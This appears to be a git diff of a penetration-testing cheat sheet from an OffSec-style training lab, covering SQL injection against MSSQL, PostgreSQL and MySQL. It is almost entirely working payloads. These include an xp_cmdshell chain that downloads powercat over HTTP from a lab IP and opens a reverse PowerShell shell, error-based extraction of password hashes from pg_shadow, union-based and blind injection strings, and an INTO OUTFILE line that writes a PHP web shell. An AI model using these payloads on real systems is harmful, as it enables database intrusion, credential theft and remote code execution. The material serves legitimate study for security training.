@@ -202,24 +202,23 @@ update users_secure SET password="$2y$10$R0cpsKNLDqDZpfxDCaq8Qufxl0uLbmwiL0k6XDR
 ```
 
 ## SQLi
+- mssql command injection
 ```bash
-# mssql command injection
 ';EXEC sp_configure 'show advanced options', 1;--
 ';RECONFIGURE;--
 ';EXEC sp_configure "xp_cmdshell", 1;--
 ';RECONFIGURE;--
 ';EXEC xp_cmdshell 'powershell.exe -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadString(''http://192.168.45.176/powercat.ps1''))"; powercat -c 192.168.45.176 -p 4444 -e powershell'; --
+```
 
-
-# postgresql command injection
+- postgresql command injection
+```bash
 ' order by 7 -- //
 ' union select 1, 1, 1, 1, 1, 1 -- //
 ' union select 'd', 1, 1, 'd', 'd', null -- //
 
-
 # Current user
 ' union select 'd', cast((SELECT concat('DATABASE: ',current_user)) as int), 1, 'd', 'd', null -- //
-
 
 # Use cast to cause error to get the database
 ' union select 'd', cast((SELECT concat('DATABASE: ',current_database())) as int), 1, 'd', 'd', null -- //
@@ -229,17 +228,40 @@ update users_secure SET password="$2y$10$R0cpsKNLDqDZpfxDCaq8Qufxl0uLbmwiL0k6XDR
 # Use case to find out tables
 cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int)
 
-
 # Use cast to find out columns for each table
 cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int)
-
 
 # Use cast to find out row for each column
 cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int)
 
-
 # Get current user's password!
 ' union select 'd', cast((SELECT concat('DATABASE: ',passwd) FROM pg_shadow limit 1 offset 1) as int), 1, 'd', 'd', null -- //
+```
+
+- mysql command injection
+```bash
+#Error-based Payloads
+offsec' OR 1=1 -- //
+' or 1=1 in (select @@version) -- //
+' OR 1=1 in (SELECT * FROM users) -- //
+' or 1=1 in (SELECT password FROM users) -- //
+' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
+
+#UNION-based payloads
+' ORDER BY 1-- //
+%' UNION SELECT database(), user(), @@version, null, null -- //
+' UNION SELECT null, null, database(), user(), @@version  -- //
+' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
+' UNION SELECT null, username, password, description, null FROM users -- //
+
+#Blind SQL Injections
+#boolean-based SQLi
+http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
+#time-based SQLi
+http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
+
+#
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
 ```
 
 ## Tools
@@ -389,6 +411,7 @@ ssh -N -R 9998 kali@192.168.118.4
 ## Checklist
 - Gobuster
 - Feroxbuster
+  - phpinfo.php --> check "DOCUMENT_ROOT"
 - nikto
 - curl -v
 - burp suite
